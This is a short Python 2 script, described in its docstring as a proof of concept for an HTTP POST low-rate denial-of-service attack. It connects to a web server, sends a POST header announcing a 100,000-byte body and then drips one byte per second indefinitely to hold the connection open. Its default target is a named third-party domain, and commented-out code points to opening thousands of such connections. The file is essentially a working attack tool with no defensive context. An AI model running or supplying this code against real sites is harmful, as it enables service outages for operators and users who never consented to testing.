#!/usr/bin/env python

'''
    a POC of http post LDOS
'''

import optparse
import socket
import time
import random

def randomMsg():
    randstr=['a','b','c','d','e','f','g','1','2','3']
    rand=random.random()
    rand=10*rand
    rand=int(round(rand,0))
    mystr=''
    for i in range(rand):
        mystr=mystr+randstr[i]

    return mystr
    

def httpPostDos(target):
    ''' main test procedures '''

    host=target
    port=80
    #max_number_of_connections=3000
    #clients=[]#configure for http-get ldos

    #for i in range(max_number_of_connections):
        
    client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #clients.append(client)
    try:
        client.connect((host,port))
    except:
        print 'connect failed'

    header="POST /a HTTP/1.1\r\n"+\
            "HOST: "+host+"\r\n"+\
            "Connection: keep-alive\r\n"+\
            "Keep-Alive: 900\r\n"+\
            "Content-Length: 100000\r\n"+\
            "Content-Type: application/x-www-form-urlencode\r\n"+\
            "Accept: *.*\r\n";
    try:
        client.send(header)
        #print 'send header successfully'+str(i)+" times"
        print 'send header successfully'
        
    except:
        print 'send header failed'

    #time.sleep(1)

    i=1;
    while True:
        #for i in range(max_number_of_connections):
        try:
            #clients[i].send('a')
            #msg=randomMsg()
            client.send('a')
            #print "Client "+str(i)+" just send a character"
            print "client sends "+str(i)+" times successfully"
        except:
            print 'send failed'
        i=i+1
        #interval=random.random()
        time.sleep(1)


def main():

    parser=optparse.OptionParser("usage <-H host>")
    parser.add_option("-H","--host",\
                      dest="tgt",help="the target host",type="string",\
                      default="www.bpos.net")
    (options,args)=parser.parse_args()
    tgt=options.tgt
    if(tgt==None):
        print parser.usage
        exit(1)
        
    #tgt="www.bpos.net"
    httpPostDos(tgt)

if __name__=="__main__":
    main()














    
    
    
